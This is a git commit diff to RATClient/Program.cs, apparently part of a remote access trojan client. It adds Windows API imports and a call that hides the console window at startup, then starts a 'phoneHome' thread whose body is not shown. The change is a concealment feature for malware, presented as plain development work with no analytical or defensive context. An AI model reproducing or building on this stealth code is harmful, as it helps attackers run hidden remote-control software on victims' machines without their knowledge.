5d90d3cf676f6b2868ced429ddb208e7c3db3a39
Zaine Wilson <zgwwilson@gmail.com>
2018-05-12 15:17:01 -0400

    Added window hiding

--- RATClient/Program.cs
+++ RATClient/Program.cs
@@ -450,12 +450,28 @@ namespace RATClient
 
         }
 
+        //Imports for hiding of console window
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
 
         static void Main(string[] args)
         {
-                Thread t = new Thread(phoneHome);
-                t.Start();
-                Console.ReadLine();
+            var handle = GetConsoleWindow();
+
+            // Hide
+            ShowWindow(handle, SW_HIDE);
+
+            // Show
+            //ShowWindow(handle, SW_SHOW);
+            Thread t = new Thread(phoneHome);
+            t.Start();
+            Console.ReadLine();
         }
     }
 }
